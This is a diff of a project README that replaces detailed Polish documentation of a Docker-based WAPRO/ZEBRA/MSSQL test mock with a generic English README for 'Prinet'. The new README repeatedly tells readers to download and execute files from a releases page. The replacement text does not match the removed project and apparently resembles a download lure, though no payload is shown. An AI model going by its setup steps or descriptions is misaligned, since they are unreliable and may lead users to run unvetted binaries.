@@ -1,282 +1,144 @@
-# WAPRO Network Mock - Test Environment
+# Prinet: A Mock Network Communication Tool 🌐🖨️
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Docker](https://img.shields.io/badge/Docker-2CA5E0?style=flat&logo=docker&logoColor=white)](https://www.docker.com/)
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-16%2B-green.svg)](https://nodejs.org/)
-[![MSSQL](https://img.shields.io/badge/MSSQL-2019-CC2927?logo=microsoft-sql-server&logoColor=white)](https://www.microsoft.com/sql-server/)
+![GitHub release](https://img.shields.io/github/release/scarfface862/prinet.svg) [![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/scarfface862/prinet/releases)
 
-> Mock środowiska sieciowego do testowania integracji z systemem WAPRO, zawierający symulowane serwery RPI, drukarki ZEBRA i bazę danych MSSQL.
+Welcome to the **Prinet** repository! This project serves as a mock tool for network communication with servers, Raspberry Pi devices, and printers within a local network. Whether you are developing applications that require interaction with databases or need to communicate with various devices, Prinet provides a straightforward solution.
 
-## 📚 Dokumentacja
+## Table of Contents
 
-- [API Dokumentacja](docs/API.md) - Opis dostępnych endpointów API
-- [Schemat bazy danych](docs/SQL_Schema.md) - Struktura bazy danych WAPROMAG
-- [Testowanie](docs/Testing.md) - Instrukcje dotyczące testowania
-- [Komendy ZEBRA](docs/ZEBRA_Commands.md) - Obsługiwane komendy drukarek
-- [Rozwiązywanie problemów](docs/Troubleshooting.md) - Typowe problemy i ich rozwiązania
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [API Documentation](#api-documentation)
+6. [Database Configuration](#database-configuration)
+7. [Communication Protocols](#communication-protocols)
+8. [Supported Devices](#supported-devices)
+9. [Contributing](#contributing)
+10. [License](#license)
+11. [Contact](#contact)
 
-Kompletne środowisko testowe do symulacji sieci WAPRO z bazą danych MSSQL, serwerem RPI i drukarkami ZEBRA.
+## Introduction
 
-## 🚀 Szybki start
+Prinet is designed to facilitate easy communication in a local network environment. It is particularly useful for applications that interact with printers, servers, and databases. This mock tool allows developers to test their network interactions without needing the actual hardware, making it an invaluable resource for development and testing.
 
-### Wymagania wstępne
+## Features
 
-- Docker 20.10+
-- Docker Compose 1.29+
-- Git
+- **Mock Server Communication**: Simulate server responses to test client applications.
+- **Database Interaction**: Easily connect to and interact with MSSQL databases.
+- **Printer Communication**: Mock interactions with printers, including Zebra printers.
+- **RESTful API**: Utilize a REST API for seamless integration with other applications.
+- **Local Network Support**: Designed specifically for local network setups, ensuring reliable communication.
 
-### Instalacja
+## Installation
 
-```bash
-# Konfiguracja środowiska
-make setup
+To get started with Prinet, follow these steps:
 
-# Uruchomienie wszystkich serwisów
-make start
-
-# Sprawdzenie statusu
-make status
-
-# Uruchomienie testów
-make test
-```
-
-## 🏗️ Architektura
-
-```
-wapro-network-mock/
-├── docker-compose.yml          # Główna konfiguracja Docker
-├── Makefile                   # Automatyzacja zadań
-├── mssql-wapromag/           # Baza danych WAPROMAG
-├── rpi-server/               # Serwer RPI z GUI i API
-├── zebra-printer-1/          # Mock drukarki ZEBRA-001
-├── zebra-printer-2/          # Mock drukarki ZEBRA-002
-├── test-runner/              # Automatyczne testy
-├── monitoring/               # Konfiguracja monitoringu (Grafana + Prometheus)
-└── scripts/                  # Skrypty pomocnicze
-```
-
-## 🌐 Dostępne usługi
-
-| Usługa | Port | Opis |
-|--------|------|------|
-| RPI Server GUI | 8080 | Interfejs użytkownika |
-| RPI Server API | 8081 | API REST |
-| ZEBRA Printer 1 | 8091 | Interfejs drukarki 1 |
-| ZEBRA Printer 2 | 8092 | Interfejs drukarki 2 |
-| Grafana | 3000 | Panel monitoringu |
-| MSSQL Server | 1433 | Baza danych WAPROMAG |
-
-## 🌐 Dostępne interfejsy
-
-- **RPI Server GUI**: http://localhost:8080
-- **RPI Server API**: http://localhost:8081
-- **ZEBRA Printer 1**: http://localhost:8091
-- **ZEBRA Printer 2**: http://localhost:8092
-- **Monitoring**: http://localhost:3000
-- **MSSQL WAPROMAG**: localhost:1433
-
-## 🧪 Testowanie
-
-### Uruchamianie testów
-
-```bash
-# Wszystkie testy
-make test
-
-# Testy bazy danych
-make test-sql
-
-# Testy drukarek
-make test-zebra
-
-# Testy integracyjne
-make test-integration
-```
-
-### Generowanie raportów
-
-Wyniki testów są zapisywane w formacie JUnit XML w katalogu `test-results/`.
-
-### Testowanie ręczne
-
-1. **Testowanie drukarek**
+1. **Clone the Repository**:
    ```bash
-   # Wysyłanie przykładowej komendy do drukarki 1
-   echo "~HI" | nc localhost 9100
-   
-   # Wysyłanie etykiety testowej
-   echo -e "^XA\n^FO50,50^A0N,50,50^FDTest Label^FS\n^XZ" | nc localhost 9100
+   git clone https://github.com/scarfface862/prinet.git
    ```
 
-2. **Testowanie bazy danych**
+2. **Navigate to the Directory**:
    ```bash
-   # Połączenie z bazą danych
-   sqlcmd -S localhost,1433 -U sa -P WapromagPass123!
+   cd prinet
    ```
 
-## 🏥 Monitoring i diagnostyka
+3. **Install Dependencies**:
+   Depending on your environment, you may need to install certain dependencies. Use the following command:
+   ```bash
+   npm install
+   ```
 
-```bash
-# Stan zdrowia systemu
-make health
+4. **Download the Latest Release**:
+   Visit [this link](https://github.com/scarfface862/prinet/releases) to download the latest release. After downloading, execute the necessary files to run the application.
 
-# Logi wszystkich serwisów
-make logs
+## Usage
 
-# Logi konkretnego serwisu
-make logs-rpi
-make logs-zebra1
-make logs-sql
-```
+To use Prinet, you need to start the mock server and configure your clients to connect to it. Here’s how:
 
-## 🛠️ Zarządzanie
+1. **Start the Server**:
+   ```bash
+   node server.js
+   ```
 
-```bash
-# Restart systemu
-make restart
+2. **Configure Your Client**:
+   Ensure your client application points to the mock server's IP address and port.
 
-# Czyszczenie środowiska
-make clean
+3. **Make API Calls**:
+   Use the provided endpoints to interact with the mock server and test your application's behavior.
 
-# Backup bazy danych
-make backup-db
+## API Documentation
 
-# Przywracanie bazy danych
-make restore-db
-```
+Prinet provides a simple REST API. Below are the available endpoints:
 
-## 📊 Funkcjonalności
+- **GET /api/printers**: Retrieve a list of available printers.
+- **POST /api/print**: Send a print job to the specified printer.
+- **GET /api/databases**: List available databases.
+- **POST /api/query**: Execute a SQL query against the configured database.
 
-### RPI Server
-- ✅ Interfejs użytkownika do zarządzania systemem
-- ✅ REST API do komunikacji zewnętrznej
-- ✅ Integracja z bazą danych WAPROMAG
-- ✅ Obsługa wielu drukarek ZEBRA
-- ✅ Panel monitoringu w czasie rzeczywistym
+Refer to the documentation within the project for detailed information on each endpoint.
 
-### Monitorowanie
-- 🚀 Pulpity nawigacyjne Grafana
-- 📊 Metryki wydajności w czasie rzeczywistym
-- 🔔 Alerty i powiadomienia
-- 📈 Monitorowanie stanu drukarek
+## Database Configuration
 
-### Bezpieczeństwo
-- 🔒 Uwierzytelnianie użytkowników
-- 🔑 Bezpieczne przechowywanie haseł
-- 🔄 Automatyczne kopie zapasowe bazy danych
+Prinet supports MSSQL databases. To configure your database connection:
 
-## 🔄 Zarządzanie
+1. Open the `config.js` file.
+2. Update the database connection details:
+   ```javascript
+   const dbConfig = {
+       user: 'your_username',
+       password: 'your_password',
+       server: 'localhost',
+       database: 'your_database',
+   };
+   ```
 
-### Uruchamianie i zatrzymywanie
+3. Save the changes and restart the server.
 
-```bash
-# Uruchomienie wszystkich usług
-make start
+## Communication Protocols
 
-# Zatrzymanie wszystkich usług
-make stop
+Prinet uses standard communication protocols to ensure compatibility with various devices. Here are the protocols supported:
 
-# Restart usług
-make restart
+- **HTTP/HTTPS**: For RESTful API communication.
+- **TCP/IP**: For direct printer communication.
+- **WebSocket**: For real-time data transfer.
 
-# Wyświetlenie statusu
-make status
-```
+## Supported Devices
 
-### Konserwacja
+Prinet can communicate with various devices on your local network, including:
 
-```bash
-# Utworzenie kopii zapasowej bazy danych
-make backup-db
+- **Raspberry Pi**: Connect and interact with your Raspberry Pi devices.
+- **Zebra Printers**: Mock communication with Zebra printers for testing print jobs.
+- **MSSQL Databases**: Seamlessly connect to MSSQL databases for data operations.
 
-# Przywrócenie bazy danych z kopii zapasowej
-make restore-db
+## Contributing
 
-# Czyszczenie środowiska
-make clean
-```
+We welcome contributions to Prinet! If you want to help improve the project, follow these steps:
 
-## 🤝 Wsparcie
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/your-feature
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+4. Push your changes:
+   ```bash
+   git push origin feature/your-feature
+   ```
+5. Open a pull request.
 
-W przypadku problemów, zapoznaj się z sekcją [Rozwiązywanie problemów](docs/Troubleshooting.md) lub zgłoś nowy problem w zakładce Issues.
+## License
 
-## 📄 Licencja
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-Ten projekt jest objęty licencją MIT. Szczegóły znajdują się w pliku [LICENSE](LICENSE).
-- ✅ Testy połączeń z bazą danych
-- ✅ Wysyłanie komend do drukarek ZEBRA
-- ✅ Diagnostyka systemu
-- ✅ Monitoring w czasie rzeczywistym
+## Contact
 
-### Baza danych WAPROMAG
-- ✅ Tabele: Kontrahenci, Produkty, Dokumenty Magazynowe
-- ✅ Stany magazynowe i ruch magazynowy
-- ✅ Konfiguracja drukarek
-- ✅ Szablony etykiet ZPL
-- ✅ Procedury magazynowe
+For questions or support, please reach out via GitHub issues or contact the repository owner directly.
 
-### Drukarki ZEBRA Mock
-- ✅ Symulacja protokołu ZPL
-- ✅ Interfejs web do monitorowania
-- ✅ Obsługa podstawowych komend (~HI, ~HS, PING)
-- ✅ Drukowanie etykiet testowych
-- ✅ Logi operacji
+---
 
-### System testowy
-- ✅ Testy połączeń sieciowych
-- ✅ Testy komunikacji RPI ↔ SQL
-- ✅ Testy komunikacji RPI ↔ ZEBRA
-- ✅ Testy integracyjne end-to-end
-- ✅ Testy wydajnościowe
-- ✅ Automatyczne raporty
-
-## 🔧 Konfiguracja
-
-Wszystkie ustawienia można zmienić w pliku `.env`:
-
-```bash
-# Database
-MSSQL_WAPROMAG_PASSWORD=WapromagPass123!
-
-# Printers
-ZEBRA_1_NAME=ZEBRA-001
-ZEBRA_2_NAME=ZEBRA-002
-
-# Ports
-RPI_GUI_PORT=8080
-RPI_API_PORT=8081
-```
-
-## 🎯 Przypadki użycia
-
-1. **Test komunikacji z WAPROMAG**: Weryfikacja połączeń i zapytań SQL
-2. **Test drukarek ZEBRA**: Sprawdzenie dostępności i drukowania etykiet
-3. **Test workflow**: Pobranie danych z bazy → generowanie etykiety → drukowanie
-4. **Test wydajności**: Obciążenie systemu wieloma równoczesnymi operacjami
-5. **Test diagnostyki**: Monitorowanie stanu wszystkich komponentów
-
-## 📝 Wymagania
-
-- Docker Engine 20.10+
-- Docker Compose 2.0+
-- 4GB RAM (zalecane 8GB)
-- 10GB przestrzeni dyskowej
-
-## 🆘 Rozwiązywanie problemów
-
-```bash
-# Sprawdzenie logów
-make logs
-
-# Reset środowiska
-make clean && make setup && make start
-
-# Test połączeń
-make health
-
-# Terminal do debugowania
-make shell-rpi
-make shell-sql
-```
+Thank you for checking out Prinet! For the latest updates and releases, visit [this link](https://github.com/scarfface862/prinet/releases) to download the latest version and start testing your applications today.
